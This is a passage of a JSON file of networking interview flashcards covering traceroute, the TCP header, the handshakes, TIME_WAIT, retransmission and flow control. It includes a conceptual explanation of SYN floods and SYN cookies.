          "a": "Traceroute discovers network hops by intentionally exploiting the IP Time-To-Live (TTL) field and ICMP Time Exceeded (Type 11) messages. 1. The client sends a packet with TTL=1. The first router decrements TTL to 0, drops the packet, and sends back an ICMP Type 11 message. The client records the router's IP and measures the RTT. 2. The client sends a packet with TTL=2. It passes Router 1 (TTL becomes 1) and reaches Router 2, where TTL becomes 0. Router 2 drops it and returns ICMP Type 11. 3. The client increments TTL by 1 sequentially (TTL=3, 4, 5...) until the packet reaches the final destination, which responds with an ICMP Echo Reply (or Port Unreachable). By recording the source IP of each returning ICMP message, the client maps the complete hop-by-hop path.",
          "tip": "Explain the step-by-step incrementing TTL mechanism (TTL=1, 2, 3...) and the role of ICMP Type 11."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "ICMP = Layer 3 diagnostic tool. Type 8 = Echo Request, Type 0 = Echo Reply, Type 11 = TTL Expired.",
        "summaryPoints": [
          "Encapsulated directly inside IP packets (IP Protocol = 1); has no port numbers.",
          "Powers `ping` (Type 8 / Type 0) to measure latency and packet loss.",
          "Powers `traceroute` by incrementing TTL to trigger ICMP Type 11 from each hop.",
          "Frequently blocked by corporate firewalls for security hardening."
        ],
        "whenToUse": "Network diagnostics, latency debugging, path tracing, and MTU discovery."
      }
    }
  ],
  "tcp-protocol": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is TCP Architecture & Segment Header Format?",
      "inSimpleWords": "Transmission Control Protocol (TCP, RFC 793) is a connection-oriented, reliable, full-duplex Transport Layer protocol providing ordered, error-checked delivery of a stream of octets between processes.",
      "analogy": "A certified registered courier service: the sender gets a signed receipt for every parcel, missing items are re-sent, and boxes delivered out-of-order are sorted sequentially before opening.",
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need TCP Architecture & Segment Header Format?",
      "problem": "The underlying IP network is connectionless and best-effort: packets can be dropped, duplicated, delayed, or arrive completely out of order.",
      "whyItMatters": "Web pages (HTTP/HTTPS), database queries (SQL), file transfers (FTP), and email (SMTP) cannot tolerate a single missing or out-of-order byte.",
      "howSolves": "TCP adds sequence numbers, cumulative acknowledgments, checksums, sliding window flow control, and timers to synthesize guaranteed reliability on top of unreliable IP."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does TCP Architecture & Segment Header Format work?",
      "steps": [
        {
          "step": 1,
          "title": "Connection Establishment",
          "desc": "3-Way Handshake synchronizes Sequence Numbers (ISN) and negotiates Maximum Segment Size (MSS)."
        },
        {
          "step": 2,
          "title": "Segment Sequencing",
          "desc": "Every byte is numbered sequentially, allowing receiver to reassemble scrambled packets into exact original order."
        },
        {
          "step": 3,
          "title": "Cumulative ACK & Retransmit",
          "desc": "Receiver acknowledges received bytes. Sender sets Retransmission Timeout (RTO); retransmits if unacknowledged."
        },
        {
          "step": 4,
          "title": "Connection Teardown",
          "desc": "4-Way Handshake gracefully closes both send and receive channels."
        }
      ],
      "vfxType": "handshake"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Source / Dest Port": "16 bits each (0 - 65535)",
        "Sequence Number": "32 bits (tracks byte stream position)",
        "Acknowledgment Number": "32 bits (next byte expected from sender)",
        "Data Offset (Header Length)": "4 bits (measures header size in 32-bit words; min 5 = 20 bytes)",
        "Control Flags (9 bits)": "URG, ACK, PSH, RST, SYN, FIN (plus NS, CWR, ECE)",
        "Window Size": "16 bits (advertised receiver buffer space for flow control)",
        "Checksum": "16 bits (verifies header + data + pseudo-header integrity)",
        "Urgent Pointer": "16 bits (points to high-priority out-of-band data)"
      },
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A user downloads a 20 MB PDF over an unstable cellular network with 5% packet loss.",
      "challenge": "If a single packet is corrupted or dropped, the PDF file would fail to open in Adobe Acrobat.",
      "resolution": "TCP detects missing sequence numbers, requests selective retransmission, and guarantees the 20 MB byte stream is delivered 100% intact.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Minimum Header Size": "20 bytes (when no options present)",
        "Maximum Header Size": "60 bytes (with 40 bytes of TCP options)",
        "MSS (Max Segment Size)": "1460 bytes (Ethernet MTU 1500 - 20B IP - 20B TCP)",
        "TCP Port 80 / 443": "HTTP / HTTPS",
        "TCP Port 22": "SSH"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for TCP Architecture & Segment Header Format. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "TCP sequence numbers count the number of packets sent.",
          "why": "TCP is a byte-stream protocol, not a packet protocol.",
          "correct": "TCP sequence numbers count the number of BYTES transmitted, not the number of packets."
        },
        {
          "wrong": "TCP guarantees real-time delivery with zero latency delay.",
          "why": "Retransmissions and sliding window acknowledgments introduce jitter and latency.",
          "correct": "TCP guarantees RELIABILITY and ORDER, not real-time speed. Video games and VoIP prefer UDP for low latency."
        },
        {
          "wrong": "ACK number in TCP confirms the last byte received.",
          "why": "TCP ACK is predictive (cumulative).",
          "correct": "The ACK number indicates the NEXT byte the receiver EXPECTS to receive (e.g. received up to byte 1000 -> Ack = 1001)."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What are the six standard control flags in the TCP header and what does each flag signify?",
          "a": "1. SYN (Synchronize): Initiates connection establishment; synchronizes initial sequence numbers (ISN). 2. ACK (Acknowledgment): Confirms receipt of bytes; indicates the 'Acknowledgment Number' field is valid. 3. FIN (Finish): Gracefully closes connection from sender's side (no more data to send). 4. RST (Reset): Abruptly terminates/aborts a connection due to an unrecoverable error or closed port. 5. PSH (Push): Requests receiver to immediately push buffered data to application without waiting for buffer to fill. 6. URG (Urgent): Indicates Urgent Pointer field is valid, pointing to high-priority out-of-band data.",
          "tip": "Mnemonic: 'Unskilled Attackers Pester Real Systems Freely' (URG, ACK, PSH, RST, SYN, FIN)."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "TCP = Connection-oriented, reliable, ordered byte stream. 20-byte base header with Seq & Ack numbers.",
        "summaryPoints": [
          "Sequence Number tracks bytes sent; ACK number tracks next byte expected.",
          "Minimum header size is 20 bytes; Maximum is 60 bytes (with options).",
          "Control flags: SYN (connect), ACK (confirm), FIN (close), RST (abort), PSH (flush), URG (priority).",
          "MSS is typically 1460 bytes on standard 1500-byte Ethernet links."
        ],
        "whenToUse": "Web applications, database connections, file transfer, and whenever zero data loss is required."
      }
    }
  ],
  "tcp-3-way-handshake": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is TCP 3-Way Handshake?",
      "inSimpleWords": "The TCP 3-Way Handshake is the 3-step synchronization process used by client and server to negotiate Initial Sequence Numbers (ISNs) and establish a reliable full-duplex socket connection.",
      "analogy": "A radio pilot check: 1. Pilot: 'Tower, do you read me? (SYN)'; 2. Tower: 'Pilot, I read you loud and clear. Do you read me? (SYN-ACK)'; 3. Pilot: 'Tower, I read you too. Ready to taxi (ACK)'. Both sides confirm they can talk and listen.",
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need TCP 3-Way Handshake?",
      "problem": "Both client and server have separate clocks and random initial sequence numbers. Transmitting data without synchronization causes old duplicate packets from previous connections to corrupt memory.",
      "whyItMatters": "Every single web request, database query, and API call must complete the 3-way handshake before any application data can travel over TCP.",
      "howSolves": "Exchanging SYN, SYN-ACK, and ACK allows both operating systems to allocate socket buffers, record mutual sequence counters, and transition to the ESTABLISHED state."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does TCP 3-Way Handshake work?",
      "steps": [
        {
          "step": 1,
          "title": "Step 1: SYN [Client -> Server]",
          "desc": "Client chooses random ISN_c (e.g. 1000), sets SYN=1 flag, and sends packet. Client enters SYN_SENT state."
        },
        {
          "step": 2,
          "title": "Step 2: SYN-ACK [Server -> Client]",
          "desc": "Server acknowledges client ISN (Ack=1001), chooses its own random ISN_s (e.g. 5000), sets SYN=1 and ACK=1. Server enters SYN_RCVD state."
        },
        {
          "step": 3,
          "title": "Step 3: ACK [Client -> Server]",
          "desc": "Client acknowledges server ISN (Ack=5001) with ACK=1 flag. Both client and server enter ESTABLISHED state. Application payload can piggyback on this step."
        }
      ],
      "vfxType": "handshake"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Packet 1 (SYN)": "Flags: SYN=1, ACK=0 | Seq = ISN_c | Ack = 0",
        "Packet 2 (SYN-ACK)": "Flags: SYN=1, ACK=1 | Seq = ISN_s | Ack = ISN_c + 1",
        "Packet 3 (ACK)": "Flags: SYN=0, ACK=1 | Seq = ISN_c + 1 | Ack = ISN_s + 1",
        "Connection Latency": "1 full Round Trip Time (1-RTT) delay before HTTP payload can be transmitted"
      },
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A browser opens a connection to an e-commerce website to load the homepage.",
      "challenge": "A delayed duplicate packet from a session closed 5 minutes ago arrives on the server's port 443.",
      "resolution": "Because the new connection negotiated a brand new randomized Initial Sequence Number (ISN), the server immediately detects the old packet's sequence number is out-of-window and discards it.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Client ISN": "1000",
        "Server ISN": "5000",
        "SYN Packet": "Seq=1000, Ack=0, SYN=1",
        "SYN-ACK Packet": "Seq=5000, Ack=1001, SYN=1, ACK=1",
        "ACK Packet": "Seq=1001, Ack=5001, ACK=1"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for TCP 3-Way Handshake (SYN, SYN-ACK, ACK). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Initial Sequence Numbers (ISNs) always start at 0.",
          "why": "Starting at 0 would make TCP vulnerable to sequence prediction attacks and delayed packet confusion.",
          "correct": "ISNs are pseudo-randomly generated by the OS kernel using a cryptographic clock algorithm."
        },
        {
          "wrong": "A 2-way handshake (SYN, ACK) is sufficient to establish a reliable connection.",
          "why": "In a 2-way handshake, the client can confirm the server received its SYN, but the server cannot verify the client received the server's sequence number.",
          "correct": "Both directions must be individually synchronized and acknowledged, requiring exactly 3 messages."
        },
        {
          "wrong": "The 3rd packet (ACK) cannot contain any user data.",
          "why": "RFC 793 explicitly permits application payload in the 3rd ACK packet.",
          "correct": "The client can piggyback HTTP GET data inside the 3rd ACK packet to save latency."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is a SYN Flood attack and how do SYN Cookies defend against it?",
          "a": "In a SYN Flood attack (DoS), an attacker sends millions of spoofed TCP SYN packets with fake source IPs to a server. For each SYN, the server allocates socket buffer memory, enters the SYN_RCVD state, and waits for the final ACK (which never arrives because the source IP was fake). The server's 'SYN backlog queue' exhausts its memory, causing it to drop legitimate connection requests. Mitigation: SYN Cookies (RFC 4987). Instead of allocating memory in SYN_RCVD, the server encodes the connection state (client IP, port, timestamp, secret key) mathematically into its own 32-bit Initial Sequence Number (ISN_s). Only when the client returns a valid ACK (with Ack = ISN_s + 1) does the server verify the cookie and allocate memory, completely immune to backlog exhaustion.",
          "tip": "Explain the SYN backlog queue exhaustion and how SYN cookies eliminate server-side state allocation."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "SYN (Seq=X) -> SYN-ACK (Seq=Y, Ack=X+1) -> ACK (Seq=X+1, Ack=Y+1). Establishes in 1 RTT.",
        "summaryPoints": [
          "Synchronizes Initial Sequence Numbers in both directions.",
          "Negotiates TCP options like Maximum Segment Size (MSS) and Window Scaling.",
          "Consumes exactly 1 full Round-Trip Time (RTT) before data exchange begins.",
          "SYN Flood attacks exploit the SYN_RCVD queue; mitigated by SYN Cookies."
        ],
        "whenToUse": "Universal foundation for web latency analysis, TLS handshakes, and socket architecture."
      }
    }
  ],
  "tcp-connection-termination": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is TCP 4-Way Handshake Termination & TIME_WAIT State?",
      "inSimpleWords": "TCP connection termination is the 4-step graceful closing handshake that independently terminates transmission in both directions (full-duplex teardown), concluding with the TIME_WAIT state.",
      "analogy": "Two diplomatic parties concluding a phone call: Party A: 'I am finished speaking. (FIN)'; Party B: 'I hear you are done. (ACK)'. Party B wraps up remaining remarks: 'I am also done now. (FIN)'; Party A: 'Understood, goodbye. (ACK)'.",
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need TCP 4-Way Handshake Termination & TIME_WAIT State?",
      "problem": "Because TCP is full-duplex, one side might finish sending data while still needing to receive remaining incoming data from the peer.",
      "whyItMatters": "Abruptly terminating a connection causes in-flight packets to be dropped and triggers application socket errors.",
      "howSolves": "Independent FIN / ACK pairs allow 'half-close' states. The TIME_WAIT state (2MSL duration) ensures lingering delayed packets clear the Internet before port recycling."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does TCP 4-Way Handshake Termination & TIME_WAIT State work?",
      "steps": [
        {
          "step": 1,
          "title": "Step 1: FIN [Client -> Server]",
          "desc": "Client has no more data to send. Sends FIN=1 flag. Client enters FIN_WAIT_1 state."
        },
        {
          "step": 2,
          "title": "Step 2: ACK [Server -> Client]",
          "desc": "Server acknowledges client FIN (Ack=Seq+1). Client enters FIN_WAIT_2. Server can still send remaining data (CLOSE_WAIT)."
        },
        {
          "step": 3,
          "title": "Step 3: FIN [Server -> Client]",
          "desc": "Server finishes its transmission. Sends its own FIN=1 flag. Server enters LAST_ACK state."
        },
        {
          "step": 4,
          "title": "Step 4: ACK [Client -> Server] & TIME_WAIT",
          "desc": "Client acknowledges server FIN. Server closes immediately. Client enters TIME_WAIT state for 2*MSL (60-120s)."
        }
      ],
      "vfxType": "handshake"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "FIN Packet": "Flags: FIN=1, ACK=1 | Signals sender has closed its outbound write channel",
        "ACK Packet": "Flags: ACK=1 | Confirms receipt of peer's FIN",
        "MSL (Max Segment Lifetime)": "Defined as 2 minutes (RFC 793) or 30-60s in modern Linux kernels",
        "TIME_WAIT Duration": "2 * MSL (typically 60 seconds) on the endpoint that initiated active close"
      },
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A high-performance microservice initiates and closes 50,000 short-lived TCP connections per second to an internal cache.",
      "challenge": "The microservice runs out of available local ephemeral ports and crashes with `EADDRNOTAVAIL`.",
      "resolution": "All 50,000 closed sockets were stuck in TIME_WAIT state, locking local ports for 60 seconds. Fix: Enable HTTP Keep-Alive connection pooling.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Active Close": "Side that sends the FIRST FIN (enters TIME_WAIT)",
        "Passive Close": "Side that receives the first FIN (enters CLOSE_WAIT -> LAST_ACK)",
        "RST Packet": "Flags: RST=1 (abrupt abort without graceful 4-way teardown)",
        "Linux Sysctl": "net.ipv4.tcp_fin_timeout = 30"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for TCP 4-Way Handshake Termination & TIME_WAIT State. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Both client and server enter the TIME_WAIT state.",
          "why": "Only the endpoint that initiates the active close (sends the first FIN) enters TIME_WAIT.",
          "correct": "The active closer enters TIME_WAIT; the passive closer closes immediately upon receiving the final ACK."
        },
        {
          "wrong": "A TCP connection can only be closed using 4 packets.",
          "why": "If the server has no pending data to send, it can combine its ACK and FIN into a single packet (3-way teardown).",
          "correct": "TCP termination can take 3 or 4 packets depending on whether the server piggybacks its FIN onto the ACK."
        },
        {
          "wrong": "Setting SO_REUSEADDR completely bypasses the TIME_WAIT state.",
          "why": "TIME_WAIT is an architectural safety mechanism enforced by the TCP state machine.",
          "correct": "SO_REUSEADDR allows a server socket to bind to a port currently in TIME_WAIT, but does not delete the state."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Why is the TIME_WAIT state necessary, and why does it last for 2MSL (Maximum Segment Lifetime)?",
          "a": "The TIME_WAIT state serves two critical architectural purposes: 1. Reliable Final ACK Delivery: If the client's final ACK (Step 4) is lost in transit, the server will time out and retransmit its FIN (Step 3). If the client closed immediately instead of waiting in TIME_WAIT, it would respond to the retransmitted FIN with an RST, making the server think the connection terminated abnormally with an error. In TIME_WAIT, the client can re-send the final ACK. 2. Preventing Old Duplicate Segment Confusion: Packets can be delayed in transit by routing loops. Waiting for 2 * MSL (Maximum Segment Lifetime = time for packet to travel + response to return) guarantees that all lingering duplicate packets from the old connection have died and cleared the Internet before a new connection reuses the same IP:Port 4-tuple.",
          "tip": "Always mention both reasons: 1. Ensuring final ACK delivery; 2. Allowing lingering duplicate packets to die (2*MSL)."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "FIN -> ACK -> FIN -> ACK (4 packets). Active closer waits in TIME_WAIT for 2*MSL (60s).",
        "summaryPoints": [
          "Full-duplex closing requires separate FIN/ACK for each direction.",
          "Active closer enters TIME_WAIT; passive closer enters CLOSE_WAIT.",
          "TIME_WAIT lasts 2MSL to drain lingering duplicate packets from the network.",
          "Connection pooling (HTTP Keep-Alive) prevents TIME_WAIT port exhaustion."
        ],
        "whenToUse": "Debugging socket exhaustion, microservice connection leaks, and high-concurrency server tuning."
      }
    }
  ],
  "tcp-reliability": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is TCP Reliability: Sequence Numbers, ACKs & Retransmission?",
      "inSimpleWords": "TCP guarantees 100% reliable data transmission across unreliable IP networks through byte sequence numbering, cumulative acknowledgments, and dynamic retransmission timers.",
      "analogy": "Reading a numbered 100-page book: if page 42 is missing in the mail, you keep telling the publisher: 'I have up to page 41, send me page 42!' until page 42 arrives.",
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need TCP Reliability: Sequence Numbers, ACKs & Retransmission?",
      "problem": "IP packets can be dropped by congested router queues, corrupted by electrical noise, or delayed beyond order.",
      "whyItMatters": "File downloads, software updates, and transactional payments would corrupt without automatic error recovery.",
      "howSolves": "Every byte is numbered. The receiver sends cumulative ACKs indicating the next expected byte. The sender retransmits missing segments when its Retransmission Timeout (RTO) expires or upon receiving 3 duplicate ACKs."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does TCP Reliability: Sequence Numbers, ACKs & Retransmission work?",
      "steps": [
        {
          "step": 1,
          "title": "Byte Stream Numbering",
          "desc": "Sender segments data and assigns each segment a Sequence Number equal to its first byte's offset."
        },
        {
          "step": 2,
          "title": "Cumulative Acknowledgment",
          "desc": "Receiver acknowledges received contiguous bytes. Ack=1001 confirms all bytes up to 1000 arrived safely."
        },
        {
          "step": 3,
          "title": "RTO Calculation (Jacobson's Algorithm)",
          "desc": "Sender measures Round Trip Time (RTT) continuously. RTO = Smoothed RTT + 4 * RTT Variation."
        },
        {
          "step": 4,
          "title": "Fast Retransmit",
          "desc": "If a packet is lost, subsequent packets trigger duplicate ACKs. Upon receiving 3 duplicate ACKs, sender retransmits immediately without waiting for RTO timer."
        }
      ],
      "vfxType": "handshake"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Cumulative ACK": "Confirms receipt of all bytes up to Ack - 1",
        "Selective ACK (SACK)": "RFC 2018 option allowing receiver to acknowledge non-contiguous blocks",
        "RTO (Retransmit Timeout)": "Dynamic timer backing up lost packets (exponential backoff on repeat loss)",
        "Fast Retransmit Trigger": "Arrival of 3 duplicate ACKs (4 identical ACKs total)"
      },
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A sender transmits Segments 1, 2, 3, 4, 5. Segment 2 is dropped by an overloaded router.",
      "challenge": "Segments 3, 4, and 5 arrive successfully at the receiver, but Segment 2 is missing.",
      "resolution": "Receiver buffers 3, 4, and 5 out-of-order and sends duplicate ACKs: 'Ack=2'. Upon receiving 3 duplicate ACKs for Segment 2, the sender executes Fast Retransmit.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Normal RTT": "50 ms",
        "Calculated RTO": "200 ms",
        "Exponential Backoff": "If retransmit times out, RTO doubles: 400ms, 800ms, 1600ms...",
        "SACK Block": "SACK 3000-4000, 5000-6000 (identifies received holes)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for TCP Reliability: Sequence Numbers, ACKs & Retransmission (RTO). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "TCP retransmits packets immediately upon detecting a single missing ACK.",
          "why": "Packets can arrive out of order due to multi-path routing; retransmitting on 1 duplicate ACK causes spurious traffic.",
          "correct": "TCP waits for 3 duplicate ACKs before triggering Fast Retransmit, tolerating minor packet reordering."
        },
        {
          "wrong": "RTO is a fixed hardcoded constant like 200 ms.",
          "why": "Network latency varies constantly between a 0.2ms LAN and a 600ms satellite link.",
          "correct": "RTO is dynamically calculated using Jacobson's algorithm based on continuous RTT measurements."
        },
        {
          "wrong": "Without SACK, TCP can tell which specific future packets arrived.",
          "why": "Standard cumulative ACK only reports the contiguous prefix.",
          "correct": "Standard cumulative ACK cannot report isolated received segments, forcing Go-Back-N retransmissions."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the difference between Go-Back-N ARQ and Selective Repeat (SACK) in TCP?",
          "a": "In traditional Go-Back-N (cumulative ACK without SACK), if segment 2 is lost out of segments 1-5, the receiver can only send 'Ack=2'. The sender has no way of knowing segments 3, 4, and 5 arrived safely, so when its timer expires, it must retransmit ALL segments from 2 onward (2, 3, 4, 5), wasting bandwidth. In Selective Repeat (enabled via Selective ACK / SACK, RFC 2018), the receiver sends SACK blocks in the TCP options header detailing non-contiguous ranges that arrived (e.g. SACK: 3000-6000). The sender retransmits ONLY the missing segment 2, preserving network capacity and reducing recovery latency.",
          "tip": "Mention RFC 2018 SACK and contrast retransmitting the whole window vs retransmitting only the missing segment."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Reliability = Cumulative ACKs + Dynamic RTO timer + Fast Retransmit (3 duplicate ACKs) + SACK.",
        "summaryPoints": [
          "Sequence numbers count individual bytes, not packets.",
          "Ack number indicates the next byte expected by the receiver.",
          "Fast Retransmit triggers on 3 duplicate ACKs without waiting for RTO timer.",
          "SACK (Selective ACK) prevents retransmitting packets that already arrived."
        ],
        "whenToUse": "Understanding packet loss recovery, network throughput bottlenecks, and Wireshark TCP stream analysis."
      }
    }
  ],
  "flow-control-sliding-window": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is TCP Flow Control & Sliding Window Protocol?",
      "inSimpleWords": "TCP Flow Control prevents a fast sender from overwhelming a slow receiver's buffer memory through the Sliding Window Protocol and the Advertised Window (rwnd) field.",
      "analogy": "Pouring water through a funnel: if you pour 5 gallons a second into a 1-gallon funnel, it overflows onto the floor. Flow control is the funnel signaling: 'Slow down! Only 1 cup of space left.'",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need TCP Flow Control & Sliding Window Protocol?",
      "problem": "A high-speed gigabit server sending data to an older smartphone on slow Wi-Fi would cause the smartphone's OS socket buffer to overflow, dropping hundreds of packets.",
      "whyItMatters": "Without flow control, mismatched CPU and memory speeds between clients and servers would cause continuous packet loss at the receiving host.",
      "howSolves": "The receiver reports its remaining free socket buffer space in every ACK packet via the 16-bit Window Size field (rwnd). The sender never sends more unacknowledged bytes than rwnd."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does TCP Flow Control & Sliding Window Protocol work?",
      "steps": [
        {
          "step": 1,
          "title": "Buffer Allocation",
          "desc": "Receiver allocates socket buffer (e.g. 64 KB)."
        },
        {
          "step": 2,
          "title": "Window Advertisement",
          "desc": "Receiver advertises remaining buffer capacity in every ACK: `Window Size = rwnd`."
        },
        {
          "step": 3,
          "title": "Window Sliding",
          "desc": "As receiver's application consumes bytes, the window slides forward, allowing sender to transmit more data."
        },
        {
          "step": 4,
          "title": "Zero Window Probing",
          "desc": "If buffer fills completely (rwnd = 0), sender halts transmission and periodically sends 1-byte probe packets to check if space opened."
        }
      ],
      "vfxType": "handshake"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Window Size Field": "16 bits (0 to 65,535 bytes)",
        "Window Scale Option": "RFC 1323 (shifts window by up to 14 bits, enabling windows up to 1 Gigabyte)",
        "Usable Window Formula": "Usable Window = Advertised Window (rwnd) - (LastByteSent - LastByteAcked)",
        "Zero Window State": "Receiver buffer 100% full; sender must freeze transmission"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A 10 Gbps database server streams a 2 GB table export to a Python script on a developer's laptop.",
      "challenge": "The Python script is slow at writing to disk, causing the laptop's OS TCP buffer to fill to capacity.",
      "resolution": "The laptop sends an ACK with Window Size = 0. The database server immediately stops transmitting, preventing packet drops until the Python script clears its buffer.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Advertised Window (rwnd)": "65,535 bytes",
        "Bytes In Flight": "20,000 bytes",
        "Usable Window Remaining": "45,535 bytes sender is allowed to transmit",
        "Zero Window Probe": "Sent every 5 seconds to prevent deadlock if window update is lost"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for TCP Flow Control & Sliding Window Protocol. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "handshake"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "Flow control prevents network router congestion.",
          "why": "Flow control protects the END-RECEIVER's buffer, not intermediate routers.",
          "correct": "Flow Control protects the RECEIVER (rwnd); Congestion Control protects the NETWORK (cwnd)."
        },
        {
          "wrong": "The maximum TCP window size is strictly 65,535 bytes forever.",
          "why": "RFC 1323 introduced the Window Scale option in the handshake.",
          "correct": "The 16-bit window can be scaled up to 1 GB using the TCP Window Scale option negotiated in SYN packets."
        },
        {
          "wrong": "If a Zero Window Update packet is lost, the connection resumes automatically.",
          "why": "Both sides would wait forever (deadlock): sender waiting for space, receiver waiting for data.",
          "correct": "The sender runs a Persist Timer sending Zero Window Probes to break potential deadlocks."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the difference between Flow Control and Congestion Control in TCP?",
          "a": "Flow Control and Congestion Control protect two completely different entities: 1. Flow Control prevents a fast sender from overwhelming the SLOW RECEIVER's buffer. It is regulated by the Advertised Window (rwnd) explicitly reported by the receiver in the TCP header. 2. Congestion Control prevents senders from overwhelming the INTERMEDIATE NETWORK routers and transmission links. It is regulated by the Congestion Window (cwnd), which is dynamically calculated by the sender based on observed latency and packet drops (AIMD, Slow Start). At any moment, the sender transmits at: Effective Window = min(rwnd, cwnd).",
          "tip": "Always write the equation: Effective Window = min(rwnd, cwnd). This single formula proves you understand both concepts."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Flow Control protects the receiver's buffer via rwnd. Sender limit = min(rwnd, cwnd).",
        "summaryPoints": [
          "Receiver reports remaining buffer space via 16-bit Window Size header field.",
